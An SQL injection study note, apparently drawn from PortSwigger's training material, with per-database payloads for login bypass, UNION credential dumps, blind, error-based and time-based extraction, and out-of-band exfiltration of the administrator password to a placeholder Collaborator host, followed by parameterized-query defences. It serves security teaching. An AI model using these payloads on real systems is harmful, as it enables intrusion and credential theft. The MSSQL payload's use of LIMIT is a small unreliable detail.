# PortSwigger Web Security Academy: Comprehensive SQL Injection (SQLi) Study Note

*A professional, synthesized reference guide compiling all key concepts, attack vectors, database-specific syntaxes, and defense mechanisms from PortSwigger's official SQL Injection curriculum.*

---

## Table of Contents
1. [Fundamentals & Vulnerability Detection](#1-fundamentals--vulnerability-detection)
2. [Query Manipulation & Basic Exploitation](#2-query-manipulation--basic-exploitation)
3. [UNION Attacks: Exploit Mechanics](#3-union-attacks-exploit-mechanics)
4. [Examining the Database (Type, Version, Schema)](#4-examining-the-database-type-version-schema)
5. [Blind SQL Injection (Logic, Errors, and Delays)](#5-blind-sql-injection-logic-errors-and-delays)
6. [Out-of-Band (OAST) SQL Injection](#6-out-of-band-oast-sql-injection)
7. [Advanced Contexts & Second-Order Attacks](#7-advanced-contexts--second-order-attacks)
8. [Prevention & Secure Coding Practices](#8-prevention--secure-coding-practices)
9. [Canonical Cheat Sheet Reference](#9-canonical-cheat-sheet-reference)

---

## 1. Fundamentals & Vulnerability Detection

### What is SQL Injection (SQLi)?
SQL injection is a critical vulnerability that arises when an application incorporates user-controllable data into a database SQL query in an unsafe, dynamic manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query. This allows them to:
*   Retrieve arbitrary data from any table in the database.
*   Bypass authentication checks.
*   Modify or delete database contents.
*   Execute administrative operations (e.g., shutdown, database-level configuration changes).
*   In some scenarios, write files to the server or execute operating system commands (RCE).

### Testing & Detection Methodologies
To identify potential SQL injection entry points, systematically submit inputs designed to test database logic:
1.  **Syntax Disruption:** Submit single quotes `'`, double quotes `"`, or parentheses `)` to check if they alter the application's response or trigger a database error.
2.  **Boolean Verification:** Inject logical conditions that resolve to `TRUE` (e.g., `' OR 1=1--`) and `FALSE` (e.g., `' OR 1=2--`) to see if the page contents or behavior changes.
3.  **Time Delays:** Inject database-specific delay functions (such as `pg_sleep(10)` or `SLEEP(10)`) to check if the response time scales with your instruction.
4.  **Out-of-Band (OAST) Lookups:** Inject payloads designed to force a DNS lookup to a controlled domain (e.g., Burp Collaborator) to check for background execution.

### SQLi in Different Parts of the Query
While SQLi most frequently occurs within the `WHERE` clause of a `SELECT` query, it can be present anywhere user input is combined with SQL command structures:
*   **`UPDATE` Statements:** Injecting into fields updated in profiles or records (e.g., altering other columns or users).
*   **`INSERT` Statements:** Injecting into signup, comment, or logging forms. This can lead to inserting arbitrary values into rows (like elevating user privileges to admin).
*   **`ORDER BY` Clauses:** Injecting into sorting parameters. Because standard parameterized inputs cannot define `ORDER BY` directions or column indices, applications often concatenate strings here. This requires specialized exploitation since boolean operators like `OR` cannot be used directly in an `ORDER BY` statement.

---

## 2. Query Manipulation & Basic Exploitation

### Retrieving Hidden Data
When an application uses a query filter in a search or catalog page, attackers can subvert the filter to view restricted records.
*   **Vulnerable Query Example:**
    ```sql
    SELECT * FROM products WHERE category = 'Gifts' AND released = 1
    ```
*   **Malicious Input:** `Gifts' OR 1=1--`
*   **Injected Query:**
    ```sql
    SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
    ```
*   **Outcome:** The comment sequence (`--`) truncates the query, neutralizing the `AND released = 1` condition. Since `1=1` is always true, the database returns all products from all categories, including unreleased ones.

### Subverting Application Logic (Login Bypass)
In insecure authentication mechanisms, SQL injection allows attackers to log in as any user without knowing the password.
*   **Vulnerable Query Example:**
    ```sql
    SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT'
    ```
*   **Malicious Username:** `administrator'--`
*   **Injected Query:**
    ```sql
    SELECT * FROM users WHERE username = 'administrator'--' AND password = 'PASSWORD_INPUT'
    ```
*   **Outcome:** The query evaluates successfully purely based on whether the username `'administrator'` exists. The password check is entirely bypassed, granting administrative access.

---

## 3. UNION Attacks: Exploit Mechanics

When an application's SQLi vulnerability returns the database results directly in the HTTP response, you can leverage the `UNION` operator to execute a second, arbitrary query and append its results to the original output.

### The Two Core Requirements of a UNION Query
1.  **Column Count Match:** The injected query must return the exact same number of columns as the original query.
2.  **Data Type Compatibility:** The data types of the columns in the injected query must be compatible (in order) with the corresponding columns of the original query.

---

### Step 1: Determining the Number of Columns Required
There are two highly reliable techniques to determine the number of columns returned by the original query.

#### Method A: The `ORDER BY` Technique
Inject an `ORDER BY` clause with an incrementing integer until an error or difference occurs:
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  <-- Success (original columns exist)
' ORDER BY 4--  <-- Error (indicates original query only has 3 columns)
```
*   **Why it works:** The database orders the output based on the specified column index. If you specify an index larger than the actual column count, a query error is triggered.

#### Method B: The `UNION SELECT NULL` Technique
Inject a `UNION SELECT` query populated entirely with `NULL` values, incrementing the number of `NULL`s until the query executes without error:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--  <-- Success (indicates 3 columns exist)
```
*   **Why it works:** `NULL` is compatible with virtually every database data type, allowing you to establish the exact column count without worrying about type compatibility.

---

### Step 2: Finding Columns with a Useful Data Type
Once the column count is established, you must identify which columns can hold the text data (strings) you want to extract. Test each column position individually by substituting a string value (e.g., `'a'`) for one of the `NULL` placeholders:
```sql
' UNION SELECT 'a', NULL, NULL--   <-- Error (Column 1 is not a string type)
' UNION SELECT NULL, 'a', NULL--   <-- Success (Column 2 is a string type)
' UNION SELECT NULL, NULL, 'a'--   <-- Error (Column 3 is not a string type)
```
If a test returns a successful response without database errors, that specific column can be used to display text-based data in the application's response.

---

### Step 3: Retrieving Interesting Data
Once you have identified a compatible string column (e.g., Column 2), you can query tables of interest, such as user credentials:
```sql
' UNION SELECT NULL, username || '~' || password, NULL FROM users--
```
*   This retrieves usernames and passwords from the `users` table and displays them in the page location corresponding to Column 2.

---

### Step 4: Retrieving Multiple Values within a Single Column
If the query only has one column that can hold string data, you can concatenate multiple fields together inside that single column. Use database-specific concatenation functions and separators to easily parse the output:

*   **Oracle:** `'foo'||'bar'`
*   **Microsoft SQL Server:** `'foo'+'bar'`
*   **PostgreSQL:** `'foo'||'bar'`
*   **MySQL:** `'foo' 'bar'` (implicit space concatenation) or `CONCAT('foo','bar')`

**Example Payload (PostgreSQL):**
```sql
' UNION SELECT NULL, username || ':' || password, NULL FROM users--
```

---

## 4. Examining the Database (Type, Version, Schema)

To formulate complex payloads, you must identify the database engine and maps of its internal tables.

### Querying Database Type & Version
| Database | Version Query Syntax | Notes / Specifics |
|---|---|---|
| **Oracle** | `SELECT banner FROM v$version`<br>`SELECT version FROM v$instance` | Oracle requires a table in all `SELECT` queries. Use the built-in `dual` table: `UNION SELECT banner, NULL FROM v$version` |
| **Microsoft** | `SELECT @@version` | Standard system variable. |
| **PostgreSQL** | `SELECT version()` | System function call. |
| **MySQL** | `SELECT @@version`<br>`SELECT version()` | System variable or function. |

---

### Listing Database Contents (Schema Discovery)
Most database systems (except Oracle) organize structural metadata in a standard schema called the `information_schema`. You can query this metadata to list all tables and columns.

#### MySQL, PostgreSQL, and Microsoft SQL Server:
1.  **List all tables in the database:**
    ```sql
    ' UNION SELECT table_name, NULL FROM information_schema.tables--
    ```
2.  **List columns within a specific table (e.g., `users`):**
    ```sql
    ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_table'--
    ```

#### Oracle Database:
Oracle uses custom system tables instead of `information_schema`.
1.  **List all accessible tables:**
    ```sql
    ' UNION SELECT table_name, NULL FROM all_tables--
    ```
2.  **List columns within a specific table:**
    ```sql
    ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_TABLE'--
    ```
    *(Note: Oracle table names are stored in uppercase by default).*

---

## 5. Blind SQL Injection (Logic, Errors, and Delays)

Blind SQL Injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the query or details of database errors. You must infer data bit by bit by analyzing side channels.

### A. Exploiting via Conditional Responses
If the application behaves differently depending on whether the query returns a result (e.g., displaying a "Welcome back" message for a valid tracking cookie), you can ask true/false questions to extract data.

*   **Logic:**
    Inject a conditional check into the parameter. If the condition is true, the query succeeds, and the tracking ID remains valid, displaying the success response.
*   **Reconstructing a Password (character-by-character):**
    1.  Test password length:
        ```sql
        TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') = 20--
        ```
    2.  Brute-force characters using the `SUBSTRING` function:
        ```sql
        TrackingId=xyz' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator') = 'a'--
        ```
        If the "Welcome back" message appears, the first character of the administrator password is `'a'`. Move to index 2, 3, etc.

---

### B. Exploiting via Conditional Errors
If the application's visual output is identical for both true and false queries (no conditional messages), you can trigger explicit database errors (like division by zero) only when a condition is met.

*   **Oracle:**
    ```sql
    SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
    ```
    *Triggering a conditional error based on a password check:*
    ```sql
    TrackingId=xyz' || (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
    ```
*   **Microsoft SQL Server:**
    ```sql
    SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END
    ```
*   **PostgreSQL:**
    ```sql
    1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)
    ```
*   **MySQL:**
    ```sql
    SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')
    ```
    *(In MySQL, selecting multiple rows in a scalar context causes a subquery error).*

---

### C. Extracting Sensitive Data via Verbose Error Messages (Visible Error-Based)
If the application hides query results but displays database error messages directly on the page, you can force the database to cast or convert sensitive data into an incompatible type, leaking the value in the error details.

*   **Microsoft SQL Server:**
    ```sql
    ' AND 1 = (SELECT CAST((SELECT password FROM users LIMIT 1) AS int))--
    ```
    *Output Error:* `Conversion failed when converting the varchar value 'secret_admin_pass' to data type int.`
*   **PostgreSQL:**
    ```sql
    ' AND CAST((SELECT password FROM users LIMIT 1) AS int) = 1--
    ```
    *Output Error:* `invalid input syntax for integer: "secret_admin_pass"`
*   **MySQL:**
    ```sql
    ' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT password FROM users LIMIT 1)))--
    ```
    *Output Error:* `XPATH syntax error: '\secret_admin_pass'`

---

### D. Exploiting via Time Delays
When the application handles all database errors gracefully and returns a completely static response, you can extract data by instructing the database to pause execution for a set duration if your condition is met.

#### Unconditional Time Delays
*   **Oracle:** `dbms_pipe.receive_message(('a'),10)`
*   **Microsoft SQL Server:** `WAITFOR DELAY '0:0:10'`
*   **PostgreSQL:** `SELECT pg_sleep(10)`
*   **MySQL:** `SELECT SLEEP(10)`

#### Conditional Time Delays
*   **Oracle:**
    ```sql
    TrackingId=xyz' || (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual)--
    ```
*   **Microsoft SQL Server:**
    ```sql
    TrackingId=xyz'; IF (SUBSTRING(password,1,1)='a') WAITFOR DELAY '0:0:10'--
    ```
*   **PostgreSQL:**
    ```sql
    TrackingId=xyz'|| (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END)--
    ```
*   **MySQL:**
    ```sql
    TrackingId=xyz' AND IF(SUBSTRING(password,1,1)='a', SLEEP(10), 'a')--
    ```

---

## 6. Out-of-Band (OAST) SQL Injection

Out-of-Band Application Security Testing (OAST) techniques are used when the injection vector is completely blind, asynchronous (processed in background tasks), or when time delays are blocked by network rate limits or load balancers. OAST works by triggering an out-of-band network interaction (DNS or HTTP) from the database server to a controlled listener (such as a Burp Collaborator subdomain).

### Triggering Out-of-Band DNS Lookups
*   **Oracle (XML/XXE Injection):**
    ```sql
    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
    ```
    *(Note: On fully patched systems requiring elevated privileges, use `SELECT UTL_INADDR.get_host_address('COLLABORATOR-SUBDOMAIN')`).*
*   **Microsoft SQL Server:**
    ```sql
    exec master..xp_dirtree '//COLLABORATOR-SUBDOMAIN/a'
    ```
*   **PostgreSQL (requires superuser privileges):**
    ```sql
    COPY (SELECT '') TO PROGRAM 'nslookup COLLABORATOR-SUBDOMAIN'
    ```
*   **MySQL (Windows Only):**
    ```sql
    SELECT LOAD_FILE('\\\\COLLABORATOR-SUBDOMAIN\\a')
    ```

### DNS Lookup with Data Exfiltration
You can append the output of a query as a subdomain in the DNS request. This sends the sensitive data directly to your Collaborator logs.
*   **Oracle:**
    ```sql
    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
    ```
*   **Microsoft SQL Server:**
    ```sql
    DECLARE @p varchar(1024); SET @p=(SELECT password FROM users WHERE username='administrator'); EXEC('master..xp_dirtree "//'+@p+'.COLLABORATOR-SUBDOMAIN/a"')
    ```
*   **MySQL (Windows Only):**
    ```sql
    SELECT password FROM users WHERE username='administrator' INTO OUTFILE '\\\\COLLABORATOR-SUBDOMAIN\\a'
    ```

---

## 7. Advanced Contexts & Second-Order Attacks

### SQL Injection in Different Contexts
SQLi is not limited to typical form parameter submissions. Applications may process user inputs inside serialized structures where special characters are parsed differently.
*   **XML Encoding Bypass:** If the application accepts XML inputs and parses them into a SQL statement, a Web Application Firewall (WAF) might block standard SQL keywords. Attackers can bypass these filters by decimal or hex-encoding their payload characters inside the XML tags:
    ```xml
    <productId>1 UNION SELECT username || &#x7e; || password FROM users</productId>
    ```
    The XML parser decodes the entities before passing them to the database engine, bypassing simple regex filters.

### Second-Order SQL Injection
First-order SQL injection occurs when the application takes input and immediately executes it. Second-order SQL injection arises when:
1.  **Ingestion:** The application accepts input, sanitizes it (or uses parameterized queries) to store it safely in the database.
2.  **Execution:** Later, in a completely separate action, the application retrieves that stored data and concatenates it unsafely into another SQL query.

#### Example Scenario (Privilege Escalation via Password Reset):
1.  **Registering:** An attacker registers with the username `admin'--`. The system safely inserts this using a prepared statement, creating a user called `admin'--`.
2.  **Exploitation:** Later, the attacker triggers a password reset or change action. The backend retrieves the username from the session and unsafely constructs a query:
    ```sql
    UPDATE users SET password = 'new_password' WHERE username = 'admin'--'
    ```
3.  **Outcome:** The query truncates at `--`, executing `UPDATE users SET password = 'new_password' WHERE username = 'admin'`. This successfully overwrites the password of the original, legitimate administrative account.

---

## 8. Prevention & Secure Coding Practices

### Primary Defense: Parameterized Queries (Prepared Statements)
The only robust defense against SQL injection is the use of parameterized queries (also known as prepared statements). This separates the query structure (code) from the user input (data).

```java
// SECURE JAVA IMPLEMENTATION
String query = "SELECT * FROM products WHERE category = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, userCategory);
ResultSet results = stmt.executeQuery();
```
*   **How it works:** The database pre-compiles the query template. When the parameter is sent later, it is treated strictly as a literal value within its column context, regardless of containing quotes, comments, or logical conditions.

### Secondary Defense: Input Validation (Allow-listing)
For SQL clauses where parameterized variables cannot be used (such as column names in `ORDER BY` or table names in dynamic table queries), implement strict allow-listing:
```python
# SECURE PYTHON ALLOW-LIST
allowed_columns = ["price", "rating", "released_date"]
user_sort = get_user_input()

if user_sort in allowed_columns:
    query = f"SELECT * FROM products ORDER BY {user_sort} DESC"
else:
    query = "SELECT * FROM products ORDER BY rating DESC"
```

### Escaping Input (Avoid as Primary)
Escaping special characters (e.g., preceding `'` with a backslash `\`) is highly discouraged as a primary defense. It is prone to implementation mistakes, character encoding bypasses, and failure to protect against non-quoted numeric injection fields.

---

## 9. Canonical Cheat Sheet Reference

### Comments
*   **Oracle:** `--comment`
*   **Microsoft SQL Server:** `--comment` or `/*comment*/`
*   **PostgreSQL:** `--comment` or `/*comment*/`
*   **MySQL:** `#comment`, `-- comment` (requires trailing space), or `/*comment*/`

### Database Metadata
*   **Schema (Non-Oracle):** `information_schema.tables` (`table_name`), `information_schema.columns` (`column_name`)
*   **Schema (Oracle):** `all_tables` (`table_name`), `all_tab_columns` (`column_name`, `table_name`)

### Useful Functions Quick Summary
*   **String Length:** `LENGTH(str)` (Oracle, PostgreSQL, MySQL), `LEN(str)` (MSSQL)
*   **Substring:** `SUBSTRING(str, offset, length)` (PostgreSQL, MySQL, MSSQL), `SUBSTR(str, offset, length)` (Oracle)
*   **Cast Type:** `CAST(val AS int)` (MSSQL, PostgreSQL), `CAST(val AS SIGNED)` (MySQL), `TO_CHAR(val)` (Oracle)
